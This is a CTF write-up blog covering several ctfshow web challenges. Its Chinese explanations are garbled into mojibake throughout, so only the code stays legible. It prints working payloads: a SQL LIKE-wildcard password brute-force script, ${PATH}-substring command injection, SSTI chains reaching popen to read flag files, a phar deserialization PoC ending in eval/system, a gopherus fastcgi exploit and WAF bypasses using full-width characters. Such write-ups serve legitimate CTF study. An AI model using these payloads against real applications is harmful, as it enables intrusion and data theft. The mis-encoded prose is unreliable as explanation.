<h2 id="web3-è«è´Ÿå©µå¨Ÿ"><a href="#web3-è«è´Ÿå©µå¨Ÿ" class="headerlink" title="web3_è«è´Ÿå©µå¨Ÿ"></a>web3_è«è´Ÿå©µå¨Ÿ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;%&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;\\&#x27;, &#x27;^&#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;sleep&#x27;]</span><br></pre></td></tr></table></figure>

<p>å•åŒå¼•å·å’Œåæ–œæ éƒ½è¢«è¿‡æ»¤äº†ï¼Œè‚¯å®šç»•ä¸è¿‡äº†</p>
<p>ç”±äºè¿™é‡Œç”¨çš„ç‰¹æ®ŠåŒ¹é…æ–¹æ³•<code>like</code></p>
<blockquote>
<p>likeæœ‰ä¸¤ä¸ªæ¨¡å¼ï¼š_å’Œ%</p>
<p>_ï¼šè¡¨ç¤ºå•ä¸ªå­—ç¬¦ï¼Œç”¨æ¥æŸ¥è¯¢å®šé•¿çš„æ•°æ®</p>
<p>%ï¼šè¡¨ç¤º0ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ï¼ˆ1ï¼‰SELECT * FROM Persons  WHERE City LIKE &#x27;N%&#x27;     &quot;Persons&quot; è¡¨ä¸­é€‰å–å±…ä½åœ¨ä»¥ &quot;N&quot; å¼€å§‹çš„åŸå¸‚é‡Œçš„äºº</span><br><span class="line">&gt;ï¼ˆ2ï¼‰SELECT * FROM Persons  WHERE City LIKE &#x27;%g&#x27;     &quot;Persons&quot; è¡¨ä¸­é€‰å–å±…ä½åœ¨ä»¥ &quot;g&quot; ç»“å°¾çš„åŸå¸‚é‡Œçš„äºº</span><br><span class="line">&gt;ï¼ˆ3ï¼‰SELECT * FROM Persons   WHERE City LIKE &#x27;%lon%&#x27;  ä» &quot;Persons&quot; è¡¨ä¸­é€‰å–å±…ä½åœ¨åŒ…å« &quot;lon&quot; çš„åŸå¸‚é‡Œçš„äºº</span><br><span class="line">&gt;ï¼ˆ4ï¼‰SELECT * FROM Persons   WHERE City NOT LIKE &#x27;%lon%&#x27;  ä» &quot;Persons&quot; è¡¨ä¸­é€‰å–å±…ä½åœ¨ä¸åŒ…å« &quot;lon&quot; çš„åŸå¸‚é‡Œçš„äºº</span><br></pre></td></tr></table></figure>
</blockquote>
<p>å¾€<code>password</code>é‡Œå¡32ä¸ª<code>_</code>ï¼Œèƒ½æ¨¡ç³ŠåŒ¹é…ï¼Œæ‰“å‡ºå›æ˜¾ï¼š<code>I have filtered all the characters. Why can you come in? get out!</code></p>
<p>è·‘ä¸ªè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://10e8ff00-4077-42a3-9cbc-b9b6fe7ff911.challenge.ctf.show/login.php&quot;</span><br><span class="line">length = 32</span><br><span class="line">tables = string.printable</span><br><span class="line">password = &quot;&quot;</span><br><span class="line">for i in range(length):</span><br><span class="line">    for table in tables:</span><br><span class="line">        payload = password + table + &quot;_&quot; * (length - i - 1)</span><br><span class="line">        r = requests.post(url, data=&#123;</span><br><span class="line">            &quot;username&quot;: &quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        if &quot;wrong username or password&quot; not in r.text:</span><br><span class="line">            password = password + table</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>è¿›å»æ˜¯ä¸ªipæµ‹è¯•ï¼Œè‡ªå·±èµ·ä¸ªå‘ç°æ˜¯ä½¿ç”¨<code>curl</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162309199.png" alt="image-20240216230905126"></p>
<p>fuzzä¸€ä¸‹è¿‡æ»¤äº†å…¨éƒ¨å°å†™å­—æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;/&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;]</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹å¯ç”¨çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;]</span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç¯å¢ƒå˜é‡ +linuxå­—ç¬¦ä¸²æˆªå– + é€šé…ç¬¦</span><br></pre></td></tr></table></figure>

<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctfé‡Œè¯»å–æ–‡ä»¶ç›¸å…³çŸ¥è¯†ç‚¹æ€»ç»“</a></p>
<p>é‡Œé¢æåˆ°è¿‡ç©ºæ ¼&#x2F;è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨<code>$&#123;PATH:0:1&#125;</code>æ¥ä»£æ›¿ï¼ŒåŒç†ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œçš„ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªæ¥ä»£æ›¿</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162327228.png" alt="image-20240216232730176"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402162329210.png" alt="image-20240216232913174"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;-&gt;ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.???-&gt;nl ????.???</span><br></pre></td></tr></table></figure>

<h2 id="1024-WEBç­¾åˆ°"><a href="#1024-WEBç­¾åˆ°" class="headerlink" title="1024_WEBç­¾åˆ°"></a>1024_WEBç­¾åˆ°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;]);</span><br></pre></td></tr></table></figure>

<p>å¯è§æ˜¯æ²¡æœ‰å‚æ•°èƒ½ä¼ å…¥çš„ï¼Œä¹Ÿæ²¡æ³•æ— å‚rce</p>
<p>ç›´æ¥å»phpinfoæ‰¾</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402181626490.png" alt="image-20240218162630417"></p>
<p>è°ƒç”¨å°±è¡Œ</p>
<h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><p>fastapiï¼Œdirsearchæ‰«å‡ºæ‰‹å†Œ<code>/docs</code></p>
<p>ç”±pythonå†™å‡ºæ¥çš„åç«¯ï¼Œå°è¯•æœ‰å›æ˜¾çš„å‡½æ•°<code>str(123)</code>è¿”å›<code>123</code></p>
<p>å°è¯•ssti</p>
<p><a href="https://xz.aliyun.com/t/6885">Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹ </a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=str(&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /mnt/f1a9&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>å…ˆè¯»æºç <code>main.py</code>ï¼Œæç¤ºflagä½ç½®ï¼Œè¿˜banäº†ä¸€äº›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;import&#x27;,&#x27;open&#x27;,&#x27;eval&#x27;,&#x27;exec&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="1024-æŸæ‹‰å›¾"><a href="#1024-æŸæ‹‰å›¾" class="headerlink" title="1024_æŸæ‹‰å›¾"></a>1024_æŸæ‹‰å›¾</h2><p>é¦–é¡µè¦æ±‚è¾“å…¥urlï¼Œè¯•äº†<code>http</code>åè®®æŠ¥é”™ï¼Œè¯•åˆ°<code>file</code>åè®®ä¸æŠ¥é”™ï¼Œåé¢æ˜¯åŒå†™ç»•è¿‡</p>
<p>è¯»ä¸€ä¸‹æºæ–‡ä»¶</p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-10-19 20:09:22</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-19 21:31:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    echo curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $bad = &#x27;file://&#x27;;</span><br><span class="line">    if(preg_match(&#x27;/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is&#x27;, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;éš¾é“æˆ‘ä¸çŸ¥é“ä½ åœ¨æƒ³ä»€ä¹ˆï¼Ÿé™¤éç»•è¿‡æˆ‘ï¼Ÿï¼&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $url=str_replace($bad,&quot;&quot;,$url);</span><br><span class="line">      curl($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; æ–‡ä»¶å·²ç»å­˜åœ¨å•¦ï¼&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;æ–‡ä»¶å­˜å‚¨åœ¨: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">      echo &quot;è¿™ä¸ªæ–‡ä»¶æˆ‘ä¸å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢ä¸€ä¸ªgifçš„æ–‡ä»¶&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>readfile.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;class.php&#x27;);</span><br><span class="line">function check($filename)&#123;  </span><br><span class="line">    if (preg_match(&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i&quot;,$filename))&#123;</span><br><span class="line">        die(&quot;å§¿åŠ¿å¤ªç®€å•å•¦ï¼Œæ¥ä¸€ç‚¹éªšçš„ï¼Ÿï¼&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">        if(strstr($file, &quot;flag&quot;) || check($file) || strstr($file, &quot;php&quot;)) &#123;</span><br><span class="line">            die(&quot;è¿™ä¹ˆç®€å•çš„è·å¾—ä¸å¯èƒ½å§ï¼Ÿï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo readfile($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __construct($c)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>unlink.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">function check($file)&#123;  </span><br><span class="line">  if (preg_match(&quot;/\.\.\//i&quot;,$file))&#123;</span><br><span class="line">      die(&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼&quot;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      return $file;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(file_exists(&quot;upload/&quot;.$file))&#123;</span><br><span class="line">      if(unlink(&quot;upload/&quot;.check($file)))&#123;</span><br><span class="line">          echo &quot;åˆ é™¤&quot;.$file.&quot;æˆåŠŸï¼&quot;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">          echo &quot;åˆ é™¤&quot;.$file.&quot;å¤±è´¥ï¼&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;è¦åˆ é™¤çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°æœ‰ä¸ª<code>class.php</code>å’Œ<code>readfile</code>å‡½æ•°ï¼Œä¸€çœ¼pharååºåˆ—åŒ–</p>
<p><a href="https://xz.aliyun.com/t/6699">phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar</a></p>
<p>poc.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">//    public function __construct($a)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;a = $a;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">//    public function __construct($b)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;b = $b;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">//    public function __construct($c)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;c = $c;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A = new A(&#x27;&#x27;);</span><br><span class="line">$B = new B(&#x27;&#x27;);</span><br><span class="line">$C = new C(&#x27;&#x27;);</span><br><span class="line">$A-&gt;a = $B;</span><br><span class="line">$B-&gt;b = $C;</span><br><span class="line">$C-&gt;c = &#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;;</span><br><span class="line">$phar = new Phar(&#x27;cat.phar&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$phar -&gt; setMetadata($A);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ ç›´æ¥ç”¨<code>compress.zlib://phar://</code>è¯»</p>
<h2 id="1024-å›¾ç‰‡ä»£ç†"><a href="#1024-å›¾ç‰‡ä»£ç†" class="headerlink" title="1024_å›¾ç‰‡ä»£ç†"></a>1024_å›¾ç‰‡ä»£ç†</h2><p>è‡ªåŠ¨è·³è½¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?picurl=aHR0cDovL3AucWxvZ28uY24vZ2gvMzcyNjE5MDM4LzM3MjYxOTAzOC8w</span><br></pre></td></tr></table></figure>

<p>base64è§£ç æ˜¯ä¸ªå›¾ç‰‡åœ°å€ï¼Œç›´æ¥æ¢ç”¨<code>file</code>åè®®èƒ½è¯»<code>passwd</code></p>
<p>å—…æ¢åˆ°nginxï¼Œè¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶<code>/etc/nginx/conf.d/default.conf</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201750089.png" alt="image-20240220175037927"></p>
<p>ç½‘ç«™ç›®å½•<code>/var/www/bushihtml</code>ï¼Œfastcgiå¼€åœ¨9000ç«¯å£</p>
<p>ç›´æ¥gopheræ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201751079.png" alt="image-20240220175154791"></p>
<h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><p>çœ‹èµ·æ¥åƒsstiï¼Œfuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;&#x27;&quot;, &#x27;.&#x27;, &#x27;_&#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;&#123;&#123;&#x27;]</span><br></pre></td></tr></table></figure>

<p>è¢«banäº†å°±æ²¡æ³•ç›´æ¥æ‰“å›æ˜¾äº†</p>
<p>ä½†æ˜¯å¯ä»¥ç”¨<code>&#123;%print(...)%&#125;</code>ä»£æ›¿</p>
<p>ä¹Ÿæœ‰æ›´éº»çƒ¦çš„ç”¨<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>ç›²æ³¨</p>
<p>è¿™é‡Œé€‰ç”¨<code>&#123;%print(...)%&#125;</code></p>
<p><a href="https://xz.aliyun.com/t/9584">ä»¥ Bypass ä¸ºä¸­å¿ƒè°­è°ˆ Flask-jinja2 SSTI çš„åˆ©ç”¨</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=&#123;%print(()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[117][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat /c*&quot;)[&quot;read&quot;]())%&#125;</span><br><span class="line"></span><br><span class="line">&#x27;_&#x27;hexç¼–ç -&gt;&#x27;\x5f&#x27;ï¼Œä¹Ÿå¯ä»¥æ¢ç”¨unicode</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯ç”¨<code>()[&quot;\x5f\x5fclass\x5f\x5f&quot;]</code>æ¥ä»£æ›¿<code>().__class__</code></p>
<h2 id="åŸè°…4"><a href="#åŸè°…4" class="headerlink" title="åŸè°…4"></a>åŸè°…4</h2><p>çœ‹èµ·æ¥å¾ˆç®€å•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php isset($_GET[&#x27;xbx&#x27;])?system($_GET[&#x27;xbx&#x27;]):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿›å»æ‰çŸ¥é“å‘½ä»¤åŸºæœ¬ä¸å¯ç”¨ï¼Œ<code>bin</code>é‡Œé¢åªæœ‰<code>ls rm sh</code>è¿™ä¸‰æ¡å‘½ä»¤å¯ç”¨</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§åˆ©ç”¨æŠ¥é”™è¯»å–æ¥è¯»åˆ°æ–‡ä»¶å†…å®¹</p>
<p>å¦‚æœæœ‰<strong>è¯»å–æ–‡ä»¶</strong>çš„æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `. /f* 2&gt;&amp;1` -urlencode&gt; echo `. /f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰<strong>æ‰§è¡Œæ–‡ä»¶</strong>çš„æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `/f* 2&gt;&amp;1` -urlencode&gt; echo `/f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>æ— éå°±æ˜¯ä¸€ä¸ªç”¨äº†<code>sh</code>æ‰§è¡Œshellè„šæœ¬çš„åŒºåˆ«</p>
<h2 id="åŸè°…5-fastapi2"><a href="#åŸè°…5-fastapi2" class="headerlink" title="åŸè°…5_fastapi2"></a>åŸè°…5_fastapi2</h2><p>ä¸¥æ ¼æ„ä¹‰æ¥è¯´ä¸æ˜¯sstiï¼Œfuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;import&#x27;, &#x27;open&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;class&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;vars&#x27;, &#x27;str&#x27;, &#x27;chr&#x27;]</span><br></pre></td></tr></table></figure>

<p>é™¤äº†ä¹‹å‰ç”¨çš„<code>str</code>å¯ä»¥é€ æˆå›æ˜¾ï¼Œ<code>list</code>åŒæ ·ä¹Ÿå¯ä»¥æ‰“å‡ºå›æ˜¾</p>
<p>å¯ä»¥ç›´æ¥ç”¨<code>list(globals())</code>çœ‹åˆ°å½“å‰çš„å…¨å±€å˜é‡</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221531945.png" alt="image-20240222153114837"></p>
<p>æ¯”è¾ƒç‰¹æ®Šçš„å°±æ˜¯å…¶ä¸­çš„<code>youdontknow</code>ï¼Œç›´æ¥è¿›å»çœ‹å°±èƒ½çŸ¥é“è¿™æ˜¯banlist</p>
<p>è€Œä¸”å±æ€§åº”è¯¥æ˜¯list</p>
<p>åˆ—è¡¨æœ‰ä¸€ä¸ªå‡½æ•°æ“ä½œæ˜¯<code>[].clear()</code>ï¼Œå¯ä»¥æ¸…ç©ºè¯¥åˆ—è¡¨å†…å…ƒç´ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=youdontknow.clear()</span><br><span class="line">q=list(youdontknow)</span><br></pre></td></tr></table></figure>

<p>å¯è§banlistå·²ç»è¢«æ¸…ç©ºäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯éšä¾¿æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()</span><br><span class="line">q=open(&quot;/flag&quot;).read()</span><br></pre></td></tr></table></figure>

<h3 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h3><blockquote>
<p>ç”±äºè§„å®šäº†æ¥æ”¶çš„qæ˜¯stringå‹ï¼Œå› æ­¤<code>&quot;&quot;.__class__</code>è¿™ç±»è¿”å›çš„classç±»å‹å°±ä¼šå¼•èµ·é”™è¯¯ï¼Œå› æ­¤éœ€è¦å°†å…¶è½¬ä¸ºstrå‹</p>
<p>å¯ä»¥<strong>é€šè¿‡<code>bytes.fromhex()</code>ç»•è¿‡wafï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä¿è¯strå‹</strong>ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=__impï½rt__(bytes.fromhex(hex(28531)[2:]).decode()).pï½pen(bytes.fromhex(hex(6c73)[2:]).decode()).readlines()</span><br><span class="line">å…¶ä¸­çš„ï½æ˜¯å…¨è§’å­—ç¬¦,å¯ä»¥ç»•è¿‡waf</span><br><span class="line">28531å’Œ6c73åˆ†åˆ«æ˜¯os,lsçš„hex</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221548773.png" alt="image-20240222154818718"></p>
<p>è¿˜æœ‰ç§æ¯”è¾ƒæŠ½è±¡çš„åŠæ³•</p>
<p>æœ‰ä¸€ä¸ªå†…ç½®å‡½æ•°æ²¡æœ‰è¢«banï¼š<code>dir()</code>ï¼Œç”¨æ¥æŸ¥çœ‹å½“å‰èŒƒå›´å†…å˜é‡</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221804818.png" alt="image-20240222180447783"></p>
